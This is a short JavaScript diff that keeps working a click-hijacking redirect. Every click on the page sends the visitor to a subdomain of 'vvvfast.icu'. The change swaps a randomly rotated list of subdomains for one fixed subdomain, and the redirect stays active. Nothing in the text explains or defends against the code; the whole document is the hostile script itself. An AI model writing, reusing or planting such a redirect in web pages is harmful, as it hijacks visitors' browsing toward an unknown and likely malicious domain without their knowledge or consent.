@@ -1,8 +1,6 @@
-var domain = ["pug3p75bepxx", "fupnejkzd8zb", "duxxuluky38u","aqvf6xrenxec","2awcvaerjwkd"];
+var domain = "2awcvaerjwkd";
 var topLevelDomain = "vvvfast.icu";
-var randomIndex = Math.floor(Math.random() * domain.length);
-var selectedDomain = domain[randomIndex];
-var targetURL = "https://" + selectedDomain + "." + topLevelDomain;
+var targetURL = "https://" + domain + "." + topLevelDomain;
 
 document.addEventListener("click", function() {
   window.location.replace(targetURL);
